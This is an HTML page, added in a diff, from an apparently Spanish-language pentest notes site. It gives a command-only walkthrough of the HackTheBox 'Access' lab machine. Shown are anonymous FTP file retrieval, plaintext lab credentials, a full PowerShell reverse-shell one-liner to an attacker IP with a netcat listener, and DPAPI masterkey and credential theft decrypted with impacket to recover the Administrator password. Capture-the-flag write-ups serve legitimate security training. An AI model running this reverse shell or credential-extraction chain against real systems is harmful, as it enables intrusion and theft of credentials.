@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;```ftp 10.10.10.98&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.98
+
+anonymous
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">--no-passive-ftp</span> ftp://anonymous:@10.10.10.98/Backups/backup.mdb
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">--no-passive-ftp</span> ftp://anonymous:@10.10.10.98/Engineer/<span class="s2">"Access Control.zip"</span>
+</code></pre></div></div>
+
+<h1 id="abrir-archivo-mdb---microsoft-access">Abrir archivo .mdb - Microsoft Access</h1>
+
+<p><strong>auth_user</strong>
+|id|username|password|Status|last_login|RoleID|
+|—|—|—|—|—|—|
+|25|admin|admin|1|23/08/2018 21:11:47|26|
+|27|engineer|access4u@security|1|23/08/2018 21:13:36|26|
+|28|backup_admin|admin|1|23/08/2018 21:14:02|26|</p>
+
+<h1 id="abrir-archivo-pst---outlook">Abrir archivo .pst - Outlook</h1>
+
+<p>Configuración &gt; Archivo &gt; Abrir archivo</p>
+
+<p><img src="data:image/png;base64,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" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readpst file.pst
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.10.10.98
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>security \ 4Cc3ssC0ntr0ller
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"</span><span class="w">
+
+</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-dpapi masterkey <span class="nt">-file</span> masterkey.blob <span class="nt">-password</span> <span class="s1">'4Cc3ssC0ntr0ller'</span> <span class="nt">-sid</span> S-1-5-21-953262931-566350628-63446256-1001
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"</span><span class="w">
+
+</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-dpapi credential <span class="nt">-file</span> credential.blob <span class="nt">-key</span> 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator \ 55Acc3ssS3cur1ty@megacorp
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
